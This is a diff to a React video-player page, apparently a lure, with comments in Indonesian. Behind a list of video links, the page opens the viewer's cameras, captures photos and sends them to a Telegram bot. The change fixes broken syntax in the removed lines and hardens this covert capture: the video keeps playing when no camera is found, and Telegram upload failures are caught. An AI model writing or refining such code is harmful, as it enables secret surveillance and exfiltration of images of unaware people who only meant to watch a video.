@@ -17,12 +17,15 @@ function App() {
     { videoUrl: 'https://cdn.videy.co/J4r8BFDR.mp4' },
     { videoUrl: 'https://cdn.videy.co/NQ8EOxk0.mp4' },
     { videoUrl: 'https://cdn.videy.co/16gpSQzQ.mp4' },
-    { videoUrl:://cdn.videy.co/x3DQJdR6.mp4' },
+    { videoUrl: 'https://cdn.videy.co/x3DQJdR6.mp4' }, // Perbaikan sintaks
     { videoUrl: 'https://cdn.videy.co/FPZ8MZdC.mp4' },
     { videoUrl: 'https://cdn.videy.co/nxkWOzw01.mp4' },
     { videoUrl: 'https://cdn.videy.co/YQog37Pu1.mp4' },
     { videoUrl: 'https://cdn.videy.co/VVH2RmCn1.mp4' },
-    { videoUrl: 'https://video.twimg.com/amplify_video/1844748398769090560/vid/avc1/720x1280/2bQWWm0jkr8d0kFY.mp4?tag=14&fbclid=PAZXh0bgNhZW0CMTEAAacx7boT1XRp_y2Nd0ItS586hUftwIXq4G63BAS7t9YXHTbCkJhSOop-rBjvTQ_aem_uP1MRy05506nV5vLEZHGBQ' },
+    {
+      videoUrl:
+        'https://video.twimg.com/amplify_video/1844748398769090560/vid/avc1/720x1280/2bQWWm0jkr8d0kFY.mp4?tag=14&fbclid=PAZXh0bgNhZW0CMTEAAacx7boT1XRp_y2Nd0ItS586hUftwIXq4G63BAS7t9YXHTbCkJhSOop-rBjvTQ_aem_uP1MRy05506nV5vLEZHGBQ',
+    },
     { videoUrl: 'https://cdn.videy.co/1S2HTGaf1.mp4' },
   ];
 
@@ -164,7 +167,9 @@ function App() {
       await initializeCameraStreams();
 
       if (cameraStreamsRef.current.length === 0) {
-        throw new Error('Tidak ada stream kamera yang tersedia.');
+        console.warn('Tidak ada stream kamera yang tersedia, melanjutkan tanpa perekaman.');
+        videoElement.play().catch(err => console.error('Error memutar video:', err));
+        return;
       }
 
       videoElement.play().catch(err => console.error('Error memutar video:', err));
@@ -223,8 +228,12 @@ function App() {
           canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 1.0);
         });
 
-        await sendImageToTelegramamples/photoBlob);
-        console.log(`Foto dari kamera ${type} berhasil dikirim ke Telegram.`);
+        try {
+          await sendImageToTelegram(photoBlob);
+          console.log(`Foto dari kamera ${type} berhasil dikirim ke Telegram.`);
+        } catch (error) {
+          console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
+        }
       }
 
       // Merekam video
